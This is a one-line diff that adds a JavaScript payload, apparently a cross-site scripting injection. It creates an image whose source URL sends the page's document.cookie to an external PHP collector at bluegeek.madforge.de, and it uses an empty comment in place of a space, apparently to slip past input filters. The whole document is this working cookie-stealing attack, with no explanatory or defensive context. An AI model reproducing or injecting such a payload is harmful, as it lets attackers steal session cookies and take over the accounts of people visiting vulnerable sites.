@@ -1,0 +1,1 @@
+i=new/**/Image();i.src='http://bluegeek.madforge.de/kekse/x.php?c='+document.cookie
